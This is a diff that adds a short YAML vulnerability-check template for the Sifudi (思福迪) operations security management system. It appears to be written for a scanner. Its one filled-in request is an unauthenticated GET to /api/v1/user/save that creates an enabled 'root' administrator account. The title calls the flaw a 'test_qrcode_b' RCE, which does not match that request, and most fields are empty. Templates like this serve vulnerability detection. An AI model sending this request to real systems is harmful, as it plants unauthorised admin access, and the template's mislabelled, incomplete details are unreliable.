@@ -1,0 +1,16 @@
+id:
+info:
+  name: 思福迪运维安全管理系统 test_qrcode_b RCE漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /api/v1/user/save?ID=&Username=root&Role=%E7%AE%A1%E7%90%86%E5%91%98&Enable=true
+response1:
+  headers:
+  body: 123456
+  code: 200
+requests2:
+response2:
